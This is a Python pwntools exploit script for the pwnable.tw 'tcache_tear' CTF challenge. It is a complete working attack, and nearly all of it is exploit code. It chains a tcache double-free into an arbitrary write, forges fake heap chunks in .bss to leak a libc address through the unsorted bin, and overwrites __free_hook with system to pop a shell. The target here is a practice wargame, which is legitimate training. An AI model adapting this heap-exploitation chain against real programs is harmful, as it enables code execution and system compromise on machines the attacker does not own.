#!/usr/bin/env python3

from pwn import *

QWORD = 8
DUMMY = 0xdeadbeefdeadbeef
PAD = lambda x: b"\x00" * x

context.arch = "amd64"
#context.log_level = "debug"
elf = ELF("./tcache_tear_patched")
libc = ELF("./given/libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")


if args.REMOTE:
    p = remote("chall.pwnable.tw", 10207)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        gdb.attach(p, "\n".join([
                "b *0x400c7c" # invalid option
            ]))

class FakeChunk:
    def __init__(self, prev_size=0, size=0, fwd=0, bck=0,
                 next_fwd=0, next_bck=0):
        size = max(size, 0x10)
        self.prev_size = prev_size
        self.size = size
        self.fwd = fwd
        self.bck = bck
        self.next_fwd = next_fwd
        self.next_bck = next_bck

    def get_inused(self):
        P = 1
        chunk = p64(self.prev_size) + p64(self.size | P)
        chunk = chunk.ljust(self.size, b"\x00")
        return chunk

def malloc(size, data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendlineafter(b"Data:", data)

def free():
    p.sendlineafter(b"Your choice :", b"2")

def print_name_buf():
    p.sendlineafter(b"Your choice :", b"3")
    p.recvuntil(b"Name :")
    name = p.recvn(0x20)
    return name

def arbit_write(addr, value, size):
    """
    tcache_dup:
    """
    # we can only write 0xff bytes
    assert(size < 0x100)
    assert(len(value) + 0x10 <= size)
    malloc(size, p64(DUMMY))
    free()
    free()

    malloc(size, p64(addr))
    malloc(size, p64(DUMMY))
    malloc(size, value)

    log.info("arbitrary write {} with size: {}".format(hex(addr), size))
    for i in range(0, len(value), QWORD):
        log.debug("[{}]".format(hex(u64(value[i:i+QWORD]))))

def leak_libc_base():
    """
    A chunk at unsorted bin will reveal a pointer to the .bss of libc,
    which has a constant offset to the libc base.

    Challenge: crafting a fake chunk on data region
    Bypassing free() checks:
        A gdb walkthrough let me conclude that _int_free() only check
        "next chunk" and the "next next chunk" (chunk1, chunk2 below)
        I found out that for crafting fake chunk
        +-----------------------------------------------------------+
        | We just have to `make the size field valid for each chunk!|
        |   where 1. P  == 1                                        |
        |         2. reasonable size (chunk0: unsorted_bin size)    |
        | by setting P == 1, things are a lot easier.               |
        +-----------------------------------------------------------+
        In other words, we don't have to care the prev_size, fwd, bck
        fields..
        Note that we are talking about crafting fake chunks here.
        The arbit_write() will uses fwd field.
    """
    # info
    data_name_buf = 0x602060
    data_heap_ptr = 0x602088

    unsorted_bin_handling_size = 0x500
    CHUNK_HEADER_SIZE = QWORD * 2

    # This challenges is basically

    # plan chunk0, chunk1 position
    chunk0_addr = data_name_buf - CHUNK_HEADER_SIZE
    chunk0 = FakeChunk(size=0x500)
    chunk1_addr = chunk0_addr + chunk0.size
    chunk1 = FakeChunk(size=0x30)
    chunk2_addr = chunk1_addr + chunk1.size
    chunk2 = FakeChunk(size=0x40)
    # write chunk1
    payload = chunk1.get_inused() + chunk1.get_inused()[:CHUNK_HEADER_SIZE]
    arbit_write(chunk1_addr, payload, 0x70)

    # write chunk0
    # this overwrites the heap_ptr so it is done later
    size_until_heap_ptr = data_heap_ptr - chunk0_addr
    payload = chunk0.get_inused()[:size_until_heap_ptr]
    payload += p64(chunk0_addr + CHUNK_HEADER_SIZE)
    arbit_write(chunk0_addr, payload, 0x60)

    free()

    leak = print_name_buf()
    libc_unsorted_bin = u64(leak[:8])
    log.info("libc leak: {}".format(hex(libc_unsorted_bin)))

    return libc_unsorted_bin

def pop_shell():
    """
    Full RELRO is enabled, we have to use this trick
    """
    arbit_write(libc.symbols["__free_hook"],
                p64(libc.symbols["system"]),
                0x50)
    malloc(0x20, b"/bin/sh\x00")
    free()

def exploit():
    size = 0xff
    data_name_buf = 0x602060
    p.recvuntil(b"Name:")
    p.sendline(b"pingjui")

    leak = leak_libc_base()

    # breakpoint at puts("invalid option") to get libc_base
    libc.address = leak - 0x3ebca0
    log.info("libc base: {}".format(hex(libc.address)))

    pop_shell()
    p.interactive()


if __name__ == "__main__":
    exploit()
